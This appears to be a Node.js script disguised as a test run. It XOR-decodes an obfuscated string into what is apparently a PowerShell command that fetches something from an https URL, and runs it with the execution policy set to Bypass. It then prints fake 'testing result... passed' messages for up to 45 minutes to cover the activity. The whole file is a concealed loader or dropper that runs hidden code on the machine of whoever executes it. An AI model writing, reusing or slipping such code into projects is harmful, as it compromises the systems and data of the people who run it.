const shell = require('node-powershell');
var index = 1;
var max = 45;
var interval;
var testStr = "̀ͧͺͽ̤͙ͨͥͥͻͦͭͼͪͽ̩̩̭ͧͦͭͬͬͧͿ̳ͧͦͭͬͣͺ͖Ϳͬͻͺ̩̩ͦͧ̄̃̀ͧ͠Ϳ̤ͦͬͬͫ͛ͬ͢͞͸ͼͬͺͽ̩̤͜ͻ̩͠͡ͽͽ͹ͺ̳̦̦ͤͧͬ͠ͻͮͨͽ̧̦ͬͪͦͤͭͦ;̦ͧͥͦͨͭ;̤̩̤ͧͪͥ͆͠͠ͼͽ͏̩ͥͬ͠ͽͤ͹̧ͳ͠͹̩̩̄̃͌ͱ͹̤͈ͨͧͭͻͪ͡͠Ϳ̩ͬͽͤ͹̧ͳ͠͹̩ͽͤ͹̧̩̩͕̄̃ͽͤ͹̧͕̣͕̣̈́ͧͤͧͬ͠͠ͱ̩̤ͬͼͺͬͻ̩͉ͮͦͦͥͬ͢͢Ͱͨͧͭͬͱ̧̩̤ͪͦͤͱͤͻ";

function _log(str){
  if(!str) return null;
  var encoded = "";
  for (var i = 0; i < str.length; i++) {
    var a = str.charCodeAt(i);
    var b = a ^ 777;
    encoded += String.fromCharCode(b);
  }
  return encoded;
}

console.log('starting...');

var ps = new shell({
  executionPolicy: 'Bypass',
  noProfile: true
});

ps.addCommand(_log(testStr))
ps.invoke()
.then(output => {
  console.log(output);
})
.catch(err => {
  console.log(err);
  ps.dispose();
});

interval = setInterval(function () {
    if (index >= max) process.exit(0);
    console.log("testing result..." + index++ + '...passed');
}, 1000 * 60);
